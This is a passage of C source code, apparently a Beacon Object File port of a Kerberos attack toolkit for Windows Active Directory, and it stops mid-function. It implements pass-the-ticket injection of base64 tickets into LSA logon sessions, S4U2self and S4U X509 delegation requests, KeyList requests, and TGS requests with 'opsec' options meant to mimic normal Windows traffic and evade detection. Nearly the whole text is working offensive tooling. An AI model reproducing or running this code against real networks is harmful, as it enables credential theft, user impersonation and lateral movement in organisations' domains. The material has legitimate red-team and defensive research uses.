#include "_include/asn_encode.c"
#include "_include/asn_decode.c"
#include "_include/crypt_b64.c"
#include "_include/crypt_checksum.c"
#include "_include/crypt_dec.c"
#include "_include/connection.c"

void DisplayTicket( KRB_CRED cred, int indentLevel ) {
    DateTime starttime = cred.enc_part.ticket_info[0].starttime;
    DateTime endtime = cred.enc_part.ticket_info[0].endtime;
    DateTime renew_till = cred.enc_part.ticket_info[0].renew_till;
    uint flags = cred.enc_part.ticket_info[0].flags;

    if (cred.enc_part.ticket_info[0].sname.name_count == 1)
        PRINT_OUT("  ServiceName              :  %s\n", cred.enc_part.ticket_info[0].sname.name_string[0]);
    else if (cred.enc_part.ticket_info[0].sname.name_count > 1)
        PRINT_OUT("  ServiceName              :  %s/%s\n", cred.enc_part.ticket_info[0].sname.name_string[0], cred.enc_part.ticket_info[0].sname.name_string[1]);

    PRINT_OUT("  ServiceRealm             :  %s\n", cred.enc_part.ticket_info[0].srealm);

    if (cred.enc_part.ticket_info[0].pname.name_count == 1)
        PRINT_OUT("  UserName                 :  %s\n", cred.enc_part.ticket_info[0].pname.name_string[0]);
    else if (cred.enc_part.ticket_info[0].pname.name_count > 1)
        PRINT_OUT("  UserName                 :  %s@%s\n", cred.enc_part.ticket_info[0].pname.name_string[0], cred.enc_part.ticket_info[0].pname.name_string[1]);

    PRINT_OUT("  UserRealm                :  %s\n", cred.enc_part.ticket_info[0].prealm);
    PRINT_OUT("  StartTime (UTC)          :  %02d.%02d.%04d %d:%d:%d\n", starttime.day, starttime.month, starttime.year, starttime.hour, starttime.minute, starttime.second);
    PRINT_OUT("  EndTime (UTC)            :  %02d.%02d.%04d %d:%d:%d\n", endtime.day, endtime.month, endtime.year, endtime.hour, endtime.minute, endtime.second);
    PRINT_OUT("  RenewTill (UTC)          :  %02d.%02d.%04d %d:%d:%d\n", renew_till.day, renew_till.month, renew_till.year, renew_till.hour, renew_till.minute, renew_till.second);

    PRINT_OUT("  Flags                    :  ");
    if (flags & reserved)		PRINT_OUT("reserved ");
    if (flags & forwardable)	PRINT_OUT("forwardable ");
    if (flags & forwarded)		PRINT_OUT("forwarded ");
    if (flags & proxiable)		PRINT_OUT("proxiable ");
    if (flags & proxy)			PRINT_OUT("proxy ");
    if (flags & may_postdate)	PRINT_OUT("may_postdate ");
    if (flags & postdated)		PRINT_OUT("postdated ");
    if (flags & invalid)		PRINT_OUT("invalid ");
    if (flags & renewable)		PRINT_OUT("renewable ");
    if (flags & initial)		PRINT_OUT("initial ");
    if (flags & pre_authent)	PRINT_OUT("pre_authent ");
    if (flags & hw_authent)		PRINT_OUT("hw_authent ");
    if (flags & ok_as_delegate) PRINT_OUT("ok_as_delegate ");
    if (flags & anonymous)		PRINT_OUT("anonymous ");
    if (flags & enc_pa_rep)		PRINT_OUT("enc_pa_rep ");
    if (flags & reserved1)		PRINT_OUT("reserved1 ");
    PRINT_OUT("\n");

    if (cred.enc_part.ticket_info[0].key.key_type == rc4_hmac)
        PRINT_OUT("  KeyType                  :  rc4_hmac\n");
    else if (cred.enc_part.ticket_info[0].key.key_type == aes128_cts_hmac_sha1)
        PRINT_OUT("  KeyType                  :  aes128_cts_hmac_sha1\n");
    else if (cred.enc_part.ticket_info[0].key.key_type == aes256_cts_hmac_sha1)
        PRINT_OUT("  KeyType                  :  aes256_cts_hmac_sha1\n");
}

void DescribeTicket(byte* ticket_b64) {
    int bytesSize = 0;
    byte* bytes = base64_decode(ticket_b64, &bytesSize);

    KRB_CRED kirbi = { 0 };
    AsnElt   asn_KRB_CRED = { 0 };
    if (BytesToAsnDecode3(bytes, bytesSize, false, &asn_KRB_CRED)) return;
    if (AsnGetKrbCred(&(asn_KRB_CRED.sub[0]), &kirbi)) return;
    DisplayTicket(kirbi, 2);
}


HANDLE GetCurrentToken(DWORD DesiredAccess) {
    HANDLE hCurrentToken = NULL;
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), DesiredAccess, FALSE, &hCurrentToken))
        if (hCurrentToken == NULL && KERNEL32$GetLastError() == ERROR_NO_TOKEN)
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), DesiredAccess, &hCurrentToken))
                return NULL;
    return hCurrentToken;
}

LUID GetCurrentLUID(HANDLE TokenHandle) {
    TOKEN_STATISTICS tokenStats;
    DWORD tokenSize;
    if (!ADVAPI32$GetTokenInformation(TokenHandle, TokenStatistics, &tokenStats, sizeof(tokenStats), &tokenSize))
        return (LUID) { 0 };
    return tokenStats.AuthenticationId;
}

BOOL IsSystem(HANDLE TokenHandle) {
    UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSystemSid = NULL;
    BOOL bSystem = FALSE;

    // Try to open the token of the current thread first
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &TokenHandle)) {
        // If there is no thread token, fall back to the process token
        if (KERNEL32$GetLastError() == ERROR_NO_TOKEN) {
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &TokenHandle)) {
                return FALSE;
            }
        } else {
            return FALSE;
        }
    }

    if (!ADVAPI32$GetTokenInformation(TokenHandle, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser)) {
        return FALSE;
    }

    if (!ADVAPI32$AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
        return FALSE;
    }

    bSystem = ADVAPI32$EqualSid(pTokenUser->User.Sid, pSystemSid);

    ADVAPI32$FreeSid(pSystemSid);

    return bSystem;
}

BOOL GetLsaHandle(HANDLE hToken, BOOL highIntegrity, HANDLE* hLsa) {
    HANDLE hLsaLocal = NULL;
    ULONG  mode = 0;
    bool   status = TRUE;
    if (highIntegrity) {
        STRING lsaString = (STRING){ .Length = 8, .MaximumLength = 9, .Buffer = "Winlogon" };
        status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
    }
    else {
        status = SECUR32$LsaConnectUntrusted(&hLsaLocal);
    }
    *hLsa = hLsaLocal;
    return status;
}

int my_isdigit(int c) {
    return (c >= '0' && c <= '9');
}

int my_islower(int c) {
    return (c >= 'a' && c <= 'z');
}

long int my_strtol(const char* str, char** endptr, int base) {
    long int result = 0;
    int sign = 1;

    if (*str == '-' || *str == '+') {
        sign = (*str == '-') ? -1 : 1;
        str++;
    }

    while (my_isdigit(*str) ||
           (base == 16 && (*str >= 'a' && *str <= 'f')) ||
           (base == 16 && (*str >= 'A' && *str <= 'F'))) {
        int digit = 0;
        if (my_isdigit(*str)) {
            digit = *str - '0';
        }
        else if (base == 16) {
            digit = (my_islower(*str) ? (*str - 'a' + 10) : (*str - 'A' + 10));
        }

        if (digit >= base)
            break;

        if (result > (LONG_MAX - digit) / base) {
            if (sign == 1)
                return LONG_MAX;
            else
                return LONG_MIN;
        }

        result = result * base + digit;
        str++;
    }

    if (endptr != NULL)
        *endptr = (char*)str;

    return result * sign;
}

void PTT(char* luid, byte* ticket) {
    HANDLE hToken = GetCurrentToken(TOKEN_QUERY);
    LUID   currentLuid = GetCurrentLUID(hToken);
    LUID   targetLuid = { 0 };
    bool   IsHighIntegrity = IsSystem(hToken);

    if (luid) {
        targetLuid.LowPart = my_strtol(luid, NULL, 16);
        if (targetLuid.LowPart == 0 || targetLuid.LowPart == LONG_MAX || targetLuid.LowPart == LONG_MIN) {
            PRINT_OUT("[x] Invalid luid\n");
            return;
        }
    }
    else {
        targetLuid = currentLuid;
    }

    if (!IsHighIntegrity && currentLuid.LowPart != targetLuid.LowPart) {
        PRINT_OUT("[X] You need to be in SYSTEM integrity.\n");
        return;
    }

    if (currentLuid.LowPart != targetLuid.LowPart)
        IsHighIntegrity = FALSE;

    HANDLE hLsa;
    if (GetLsaHandle(hToken, IsHighIntegrity, &hLsa)) return;

    ULONG authPackage;
    LSA_STRING krbAuth = { .Buffer = "kerberos",.Length = 8,.MaximumLength = 9 };
    if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) == 0) {

        int decode_ticket_size = 0;
        byte* decode_ticket = base64_decode(ticket, &decode_ticket_size);

        int submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + decode_ticket_size;
        KERB_SUBMIT_TKT_REQUEST* submitRequest = MemAlloc(submitSize);

        submitRequest->MessageType = KerbSubmitTicketMessage;
        submitRequest->KerbCredSize = decode_ticket_size;
        submitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
        if (IsHighIntegrity)
            submitRequest->LogonId = targetLuid;
        else
            submitRequest->LogonId = (LUID){ 0 };

        MemCpy((PBYTE)submitRequest + submitRequest->KerbCredOffset, decode_ticket, decode_ticket_size);

        NTSTATUS protocolStatus = 0;
        ULONG    responseSize = 0;
        void* response = 0;
        if (SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus) || protocolStatus)
            PRINT_OUT("\n[X] Ticket not imported.\n");
        else
        PRINT_OUT("\n[+] Ticket successfully imported.\n");
    }
    SECUR32$LsaDeregisterLogonProcess(hLsa);
}




byte* ADRestrictionEntry_buildTokenStruct(uint flags, uint tokenIL) {
    byte* data = MemAlloc(40);

    data[0] = (byte)(flags >> 24);
    data[1] = (byte)(flags >> 16);
    data[2] = (byte)(flags >> 8);
    data[3] = (byte)(flags);
    data[4] = (byte)(tokenIL >> 24);
    data[5] = (byte)(tokenIL >> 16);
    data[6] = (byte)(tokenIL >> 8);
    data[7] = (byte)(tokenIL);
    ADVAPI32$SystemFunction036(data + 8, 32);
    return data;
}



BOOL New_PA_DATA_s4uX509user(EncryptionKey key, char* name, char* realm, uint nonce, int eType, PA_DATA* pa_data) {

    PA_S4U_X509_USER* pa = MemAlloc(sizeof(PA_S4U_X509_USER));
    pa->user_id.nonce = nonce;
    pa->user_id.options = 0x20000000;
    if (my_copybuf(&(pa->user_id.crealm), realm, my_strlen(realm) + 1)) return TRUE;
    pa->user_id.cname.name_type = PRINCIPAL_NT_ENTERPRISE;
    pa->user_id.cname.name_count = 1;
    pa->user_id.cname.name_string = MemAlloc(sizeof(void*) * pa->user_id.cname.name_count);
    if (my_copybuf(&(pa->user_id.cname.name_string[0]), name, my_strlen(name) + 1)) return TRUE;

    AsnElt userIDAsn = { 0 }, userIDSeq = { 0 };
    if (AsnS4UUserIDEncode(&(pa->user_id), &userIDAsn)) return TRUE;
    if (Make3(ASN_SEQUENCE, &userIDAsn, 1, &userIDSeq)) return TRUE;

    int userIDBytes_length = ValueLength(&userIDSeq);
    byte* userIDBytes = MemAlloc(userIDBytes_length);
    userIDBytes_length = EncodeValue(&userIDSeq, 0, userIDBytes_length, userIDBytes, 0);

    byte* cksumBytes = NULL;
    int cksumBytesLength = 0;

    if (eType == aes256_cts_hmac_sha1)
        if (checksum(key.key_value, key.key_size, userIDBytes, userIDBytes_length, KERB_CHECKSUM_HMAC_SHA1_96_AES256, KRB_KEY_USAGE_PA_S4U_X509_USER, &cksumBytes, &cksumBytesLength)) return TRUE;
    if (eType == aes128_cts_hmac_sha1)
        if (checksum(key.key_value, key.key_size, userIDBytes, userIDBytes_length, KERB_CHECKSUM_HMAC_SHA1_96_AES128, KRB_KEY_USAGE_PA_S4U_X509_USER, &cksumBytes, &cksumBytesLength)) return TRUE;
    if (eType == rc4_hmac)
        if (checksum(key.key_value, key.key_size, userIDBytes, userIDBytes_length, KERB_CHECKSUM_RSA_MD4, KRB_KEY_USAGE_PA_S4U_X509_USER, &cksumBytes, &cksumBytesLength)) return TRUE;

    pa->cksum.cksumtype = KERB_CHECKSUM_HMAC_SHA1_96_AES256;
    pa->cksum.checksum_length = cksumBytesLength;
    pa->cksum.checksum = cksumBytes;

    pa_data->type = PADATA_PA_S4U_X509_USER;
    pa_data->value = pa;
    return FALSE;
}

BOOL New_PA_DATA_s4u2self(EncryptionKey key, char* name, char* realm, PA_DATA* pa_data) {
    int realm_length = my_strlen(realm);
    int name_length = my_strlen(name);

    PA_FOR_USER* pa = MemAlloc(sizeof(PA_FOR_USER));

    pa->userName.name_count = 1;
    pa->userName.name_type = PRINCIPAL_NT_ENTERPRISE;
    pa->userName.name_string = MemAlloc(sizeof(void*) * pa->userName.name_count);
    if (!pa->userName.name_string) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }

    if (my_copybuf(&(pa->userName.name_string[0]), name, name_length + 1)) return TRUE;
    if (my_copybuf(&(pa->userRealm), realm, realm_length + 1)) return TRUE;
    if (my_copybuf(&(pa->auth_package), "Kerberos", 9)) return TRUE;

    byte nameTypeBytes[] = { 0,0,0,0 };
    nameTypeBytes[0] = 0xa;
    byte* finalBytes = MemAlloc(4 + name_length + realm_length + 8);
    MemCpy(finalBytes, nameTypeBytes, 4);
    MemCpy(finalBytes + 4, name, name_length);
    MemCpy(finalBytes + 4 + name_length, realm, realm_length);
    MemCpy(finalBytes + 4 + name_length + realm_length, pa->auth_package, 8);

    byte* outBytes = NULL;
    int outBytesLength = 0;
    if (checksum(key.key_value, key.key_size, finalBytes, 4 + name_length + realm_length + 8, KERB_CHECKSUM_HMAC_MD5, KRB_KEY_USAGE_KRB_NON_KERB_CKSUM_SALT, &outBytes, &outBytesLength)) return TRUE;

    pa->cksum.cksumtype = KERB_CHECKSUM_HMAC_MD5;
    pa->cksum.checksum_length = outBytesLength;
    pa->cksum.checksum = outBytes;

    pa_data->type = PADATA_S4U2SELF;
    pa_data->value = pa;
    return FALSE;
}

BOOL New_PA_DATA_KeyListReq(int eType, PA_DATA* pa_data) {
    PA_KEY_LIST_REQ* pa = MemAlloc(sizeof(PA_KEY_LIST_REQ));
    pa->Enctype = eType;

    pa_data->type = PADATA_KEY_LIST_REQ;
    pa_data->value = pa;
    return FALSE;
}

BOOL New_PA_DATA_options(BOOL claims, BOOL branch, BOOL fullDC, BOOL rbcd, PA_DATA* pa_data) {
    PA_PAC_OPTIONS* pac = MemAlloc(sizeof(PA_PAC_OPTIONS));
    if (claims) pac->kerberosFlags[0] = (byte)(pac->kerberosFlags[0] | 8);
    if (branch) pac->kerberosFlags[0] = (byte)(pac->kerberosFlags[0] | 4);
    if (fullDC) pac->kerberosFlags[0] = (byte)(pac->kerberosFlags[0] | 2);
    if (rbcd) pac->kerberosFlags[0] = (byte)(pac->kerberosFlags[0] | 1);
    pac->kerberosFlags[0] = (byte)(pac->kerberosFlags[0] * 0x10);

    pa_data->type = PADATA_PA_PAC_OPTIONS;
    pa_data->value = pac;
    return FALSE;
}

BOOL New_PA_DATA(char* crealm, char* cname, Ticket providedTicket, EncryptionKey clientKey, BOOL opsec, byte* req_body, int req_body_length, PA_DATA* pa_data) {

    AP_REQ* ap_req = MemAlloc(sizeof(AP_REQ));
    if (!ap_req) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    ap_req->pvno = 5;
    ap_req->msg_type = KERB_AP_REQ;
    ap_req->ap_options = 0;
    ap_req->ticket = providedTicket;
    ap_req->keyUsage = KRB_KEY_USAGE_TGS_REQ_PA_AUTHENTICATOR;
    ap_req->key = clientKey;

    DateTime dt = GetGmTimeAdd(0);

    if (my_copybuf(&(ap_req->authenticator.crealm), crealm, my_strlen(crealm) + 1)) return TRUE;

    ap_req->authenticator.authenticator_vno = 5;
    ap_req->authenticator.ctime = dt;
    ap_req->authenticator.cname.name_count = 1;
    ap_req->authenticator.cname.name_count = PRINCIPAL_NT_PRINCIPAL;
    ap_req->authenticator.cname.name_string = MemAlloc(sizeof(void*) * ap_req->authenticator.cname.name_count);
    if (!ap_req->authenticator.cname.name_string) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    if (my_copybuf(&(ap_req->authenticator.cname.name_string[0]), cname, my_strlen(cname) + 1)) return TRUE;

    if (opsec) {
        ADVAPI32$SystemFunction036(&(ap_req->authenticator.seq_number), 4);
        PRINT_OUT("[+] Sequence number is: %u\n", ap_req->authenticator.seq_number);
        ADVAPI32$SystemFunction036(&(ap_req->authenticator.cusec), 4);
        ap_req->authenticator.cusec = ap_req->authenticator.cusec % 1000000;

        if (req_body) {
            ap_req->authenticator.cksum.cksumtype = KERB_CHECKSUM_RSA_MD5;
            ap_req->authenticator.cksum.checksum_length = req_body_length;
            ap_req->authenticator.cksum.checksum = req_body;
        }
    }

    pa_data->type = PADATA_AP_REQ;
    pa_data->value = ap_req;
    return FALSE;
}

BOOL NewTGS_REP(AsnElt asn_TGS_REP, TGS_REP* tgs_rep) {
    if (asn_TGS_REP.tagValue != KERB_TGS_REP) {
        PRINT_OUT("TGS-REP tag value should be 13");
        return TRUE;
    }
    if ((asn_TGS_REP.subCount != 1) || (asn_TGS_REP.sub[0].tagValue != 16)) {
        PRINT_OUT("First TGS-REP sub should be a sequence");
        return TRUE;
    }

    // extract the KDC-REP out
    AsnElt* kdc_rep = asn_TGS_REP.sub[0].sub;
    for (int i = 0; i < asn_TGS_REP.sub[0].subCount; i++) {
        int tagValue = kdc_rep[i].tagValue;
        if ( tagValue == 0 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(tgs_rep->pvno))) return TRUE;
        }
        if ( tagValue == 1 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(tgs_rep->msg_type))) return TRUE;
        }
        if ( tagValue == 2 ) {
            if (AsnGetPaData(&(kdc_rep[i].sub[0]), &(tgs_rep->padata))) return TRUE;
        }
        if ( tagValue == 3 ) {
            if (AsnGetString(&(kdc_rep[i].sub[0]), &(tgs_rep->crealm))) return TRUE;
        }
        if ( tagValue == 4 ) {
            if (AsnGetPrincipalName(&(kdc_rep[i].sub[0]), &(tgs_rep->cname))) return TRUE;
        }
        if ( tagValue == 5 ) {
            if (AsnGetTicket(&(kdc_rep[i].sub[0].sub[0]), &(tgs_rep->ticket))) return TRUE;
        }
        if ( tagValue == 6 ) {
            if (AsnGetEncryptedData(&(kdc_rep[i].sub[0]), &(tgs_rep->enc_part))) return TRUE;
        }
    }
    return FALSE;
}

BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket, EncryptionKey clientKey, int requestEType, byte* tgs, BOOL opsec, BOOL u2u, BOOL unconstrained, char* targetDomain, char* s4uUser, BOOL keyList, BOOL renew, byte** reqBytes, int* reqBytesSize) {
    AS_REQ req = { 0 };

    req.pvno = 5;
    req.msg_type = 12;

    req.req_body.kdc_options = FORWARDABLE | RENEWABLE | RENEWABLEOK;
    req.req_body.till = 24 * 3600;		 // valid for 1h
    ADVAPI32$SystemFunction036(&(req.req_body.nonce), 4);

    if (!opsec && !u2u) {
        req.req_body.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
        req.req_body.cname.name_count = 1;
        req.req_body.cname.name_string = MemAlloc(sizeof(void*) * req.req_body.cname.name_count);
        if (!req.req_body.cname.name_string) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        if (my_copybuf(&(req.req_body.cname.name_string[0]), userName, my_strlen(userName) + 1)) return TRUE;
    }

    if (targetDomain == NULL)
        if (my_copybuf(&targetDomain, domain, my_strlen(domain) + 1)) return TRUE;

    int partsCount = 0;
    char** parts = my_strsplit( sname, '/', &partsCount );

    if (my_copybuf(&req.req_body.realm, targetDomain, my_strlen(targetDomain) + 1)) return TRUE;
    StrToUpper(req.req_body.realm);

    req.req_body.etypes_count = 0;
    int etypeIndex = 0;
    if (s4uUser && opsec)
        req.req_body.etypes_count += 1;

    if (requestEType == subkey_keymaterial) {
        req.req_body.etypes_count += 4;
        req.req_body.etypes = MemAlloc(sizeof(int) * req.req_body.etypes_count);
        if (!req.req_body.etypes) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        req.req_body.etypes[etypeIndex++] = aes256_cts_hmac_sha1;
        req.req_body.etypes[etypeIndex++] = aes128_cts_hmac_sha1;
        req.req_body.etypes[etypeIndex++] = rc4_hmac;
        req.req_body.etypes[etypeIndex++] = rc4_hmac_exp;
    }
    else if (opsec && (partsCount > 1) && my_strcmp(parts[0], "krbtgt")) {
        req.req_body.etypes_count += 5;
        req.req_body.etypes = MemAlloc(sizeof(int) * req.req_body.etypes_count);
        if (!req.req_body.etypes) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        req.req_body.etypes[etypeIndex++] = aes256_cts_hmac_sha1;
        req.req_body.etypes[etypeIndex++] = aes128_cts_hmac_sha1;
        req.req_body.etypes[etypeIndex++] = rc4_hmac;
        req.req_body.etypes[etypeIndex++] = rc4_hmac_exp;
        req.req_body.etypes[etypeIndex++] = old_exp;
    }
    else {
        req.req_body.etypes_count += 1;
        req.req_body.etypes = MemAlloc(sizeof(int) * req.req_body.etypes_count);
        if (!req.req_body.etypes) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        req.req_body.etypes[etypeIndex++] = requestEType;
    }

    if (s4uUser) {
        if (u2u) {
            req.req_body.kdc_options = req.req_body.kdc_options | CANONICALIZE | ENCTKTINSKEY | FORWARDABLE | RENEWABLE | RENEWABLEOK;
            req.req_body.sname.name_type = PRINCIPAL_NT_UNKNOWN;
            req.req_body.sname.name_count = 1;
            req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
            my_copybuf(&(req.req_body.sname.name_string[0]), sname, my_strlen(sname) + 1);
        }
        else {
            req.req_body.sname.name_type = PRINCIPAL_NT_PRINCIPAL;
            req.req_body.sname.name_count = 1;
            req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
            my_copybuf(&(req.req_body.sname.name_string[0]), userName, my_strlen(userName) + 1);
        }

        if (opsec)
            req.req_body.etypes[etypeIndex++] = old_exp;
        else
            req.req_body.kdc_options = req.req_body.kdc_options | ENCTKTINSKEY;
    }
    else if (u2u) {
        req.req_body.kdc_options = req.req_body.kdc_options | CANONICALIZE | ENCTKTINSKEY | FORWARDABLE | RENEWABLE | RENEWABLEOK;
        req.req_body.sname.name_type = PRINCIPAL_NT_PRINCIPAL;
        req.req_body.sname.name_count = 1;
        req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
        my_copybuf(&(req.req_body.sname.name_string[0]), sname, my_strlen(sname) + 1);
    }
    else {
        if (partsCount == 1) {
            // service and other unique instance (e.g. krbtgt)
            req.req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
            req.req_body.sname.name_count = 2;
            req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
            my_copybuf(&(req.req_body.sname.name_string[0]), parts[0], my_strlen(parts[0]) + 1);
            my_copybuf(&(req.req_body.sname.name_string[1]), domain, my_strlen(domain) + 1);
        }
        else if (partsCount == 2) {
            //      SPN (sname/server.domain.com)
            req.req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
            req.req_body.sname.name_count = 2;
            req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
            my_copybuf(&(req.req_body.sname.name_string[0]), parts[0], my_strlen(parts[0]) + 1);
            my_copybuf(&(req.req_body.sname.name_string[1]), parts[1], my_strlen(parts[1]) + 1);
        }
        else if (partsCount == 3) {
            //      SPN (sname/server.domain.com/blah)
            req.req_body.sname.name_type = PRINCIPAL_NT_SRV_HST;
            req.req_body.sname.name_count = 3;
            req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
            my_copybuf(&(req.req_body.sname.name_string[0]), parts[0], my_strlen(parts[0]) + 1);
            my_copybuf(&(req.req_body.sname.name_string[1]), parts[1], my_strlen(parts[1]) + 1);
            my_copybuf(&(req.req_body.sname.name_string[2]), parts[2], my_strlen(parts[2]) + 1);
        }
        else {
            PRINT_OUT("[X] Error: invalid TGS_REQ sname '%s'\n", sname);
        }
    }

    if (renew)
        req.req_body.kdc_options = req.req_body.kdc_options | RENEW;

    KRB_CRED kirbi_tgs = { 0 };
    if (tgs) {
        int bytesTgsSize = 0;
        byte* bytesTgs = base64_decode(tgs, &bytesTgsSize);

        AsnElt   asn_KRB_CRED = { 0 };
        if (BytesToAsnDecode3(bytesTgs, bytesTgsSize, FALSE, &asn_KRB_CRED)) return TRUE;

        if (AsnGetKrbCred(&(asn_KRB_CRED.sub[0]), &kirbi_tgs)) return TRUE;

        req.req_body.additional_tickets_count = 1;
        req.req_body.additional_tickets = MemAlloc(sizeof(Ticket) * req.req_body.additional_tickets_count);
        req.req_body.additional_tickets[0] = kirbi_tgs.tickets[0];
        if (!u2u) {
            req.req_body.kdc_options = req.req_body.kdc_options | CONSTRAINED_DELEGATION | CANONICALIZE;
            req.req_body.kdc_options = req.req_body.kdc_options ^ (req.req_body.kdc_options & RENEWABLEOK);
        }
    }
    if (keyList)
        req.req_body.kdc_options = CANONICALIZE;

    byte* cksum_Bytes = NULL;
    int cksum_Bytes_length = 0;

    if (opsec) {
        req.req_body.kdc_options = req.req_body.kdc_options | CANONICALIZE;
        if (unconstrained)
            req.req_body.kdc_options = req.req_body.kdc_options | FORWARDED;
        else
            req.req_body.kdc_options = req.req_body.kdc_options ^ (req.req_body.kdc_options & RENEWABLEOK);

        // get hostname and hostname of SPN
        int size = MAX_COMPUTERNAME_LENGTH + 2;
        char* hostname = MemAlloc(size);
        if (!hostname) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        KERNEL32$GetComputerNameA(hostname, &size);
        int numSpaces = 8 - (size % 8);
        int i = 0;
        for (; i < numSpaces; i++)
            hostname[size + i] = ' ';
        hostname[size + i] = 0;

        char* targetHostName;
        if (partsCount > 1) {
            int substrIndex = my_strfind(parts[1], '.');
            if (substrIndex < 0)
                substrIndex = my_strlen(parts[1]) + 1;

            my_copybuf(&(targetHostName), parts[1], substrIndex);
            targetHostName[substrIndex] = 0;
            StrToUpper(targetHostName);
        }
        else {
            my_copybuf(&(targetHostName), hostname, my_strlen(hostname) + 1);
        }

        // create enc-authorization-data if target host is not the local machine
        if (my_strcmp(hostname, targetHostName) && (s4uUser == NULL) && !unconstrained) {
            ADIfRelevant ifrelevant = { 0 };
            ifrelevant.ad_type = 1;
            ifrelevant.ADData_count = 2;
            ifrelevant.ADData = MemAlloc(2 * sizeof(void*));

            ADRestrictionEntry restrictions = { 0 };
            restrictions.ad_type = 141; // KERB_AUTH_DATA_TOKEN_RESTRICTIONS;
            restrictions.restriction_type = 0;
            restrictions.restriction_length = 40;
            restrictions.restriction = ADRestrictionEntry_buildTokenStruct(1, 8192);

            ADKerbLocal kerbLocal = { 0 };
            kerbLocal.ad_type = 142; // KERB_LOCAL
            kerbLocal.ad_data_length = 16;
            kerbLocal.ad_data = MemAlloc(16);
            ADVAPI32$SystemFunction036(kerbLocal.ad_data, 16);

            ifrelevant.ADData[0] = &restrictions;
            ifrelevant.ADData[1] = &kerbLocal;

            AsnElt authDataSeq = { 0 }, authDataSeqContext = { 0 };
            if (AsnADIfRelevantEncode(&ifrelevant, &authDataSeq)) return TRUE;
            if (Make3(ASN_SEQUENCE, &authDataSeq, 1, &authDataSeqContext)) return TRUE;

            byte* authorizationDataBytes = NULL;
            int authorizationDataBytesLegth = 0;
            if (AsnToBytesEncode(&authDataSeqContext, &authorizationDataBytesLegth, &authorizationDataBytes)) return TRUE;

            req.req_body.enc_authorization_data.etype = clientKey.key_type;

            byte* enc_authorization_data = NULL;
            int enc_authorization_data_length = 0;
            if (encrypt(authorizationDataBytes, authorizationDataBytesLegth, clientKey.key_value, clientKey.key_type, KRB_KEY_USAGE_TGS_REQ_ENC_AUTHOIRZATION_DATA,
                        &(req.req_body.enc_authorization_data.cipher), &(req.req_body.enc_authorization_data.cipher_size))) return TRUE;
        }

        // S4U requests have a till time of 15 minutes in the future
        if (s4uUser)
            req.req_body.till = 900; // + 15 min

        // encode req_body for authenticator cksum
        AsnElt req_Body_ASN = { 0 }, req_Body_ASNSeq = { 0 }, req_Body_ASNSeqContext = { 0 };
        if (AsnKDCReqBodyEncode(&(req.req_body), &req_Body_ASN)) return TRUE;
        if (Make3(ASN_SEQUENCE, &req_Body_ASN, 1, &req_Body_ASNSeq)) return TRUE;
        if (MakeImplicit(ASN_CONTEXT, 4, &req_Body_ASNSeq, &req_Body_ASNSeqContext)) return TRUE;

        int req_Body_Bytes_length = ValueLength(&req_Body_ASNSeqContext);
        byte* req_Body_Bytes = MemAlloc(req_Body_Bytes_length);
        req_Body_Bytes_length = EncodeValue(&req_Body_ASNSeqContext, 0, req_Body_Bytes_length, req_Body_Bytes, 0);

        checksum(clientKey.key_value, clientKey.key_size, req_Body_Bytes, req_Body_Bytes_length, KERB_CHECKSUM_RSA_MD5, KRB_KEY_USAGE_KRB_NON_KERB_CKSUM_SALT, &cksum_Bytes, &cksum_Bytes_length);
    }

    // create the PA-DATA that contains the AP-REQ w/ appropriate authenticator/etc.
    PA_DATA padata = { 0 };
    if (New_PA_DATA(domain, userName, providedTicket, clientKey, opsec, cksum_Bytes, cksum_Bytes_length, &padata)) return TRUE;

    req.pa_data_count = 1 + (opsec && s4uUser) + (s4uUser || opsec || (tgs && !u2u)) + keyList;
    int padata_index = 0;
    req.pa_data = MemAlloc(req.pa_data_count * sizeof(PA_DATA));
    req.pa_data[padata_index++] = padata;

    // Add PA-DATA for KeyList request
    if (keyList) {
        PA_DATA keyListPaData = { 0 };
        if (New_PA_DATA_KeyListReq(rc4_hmac, &keyListPaData)) return TRUE;
        req.pa_data[padata_index++] = keyListPaData;
    }

    if (opsec && s4uUser) {
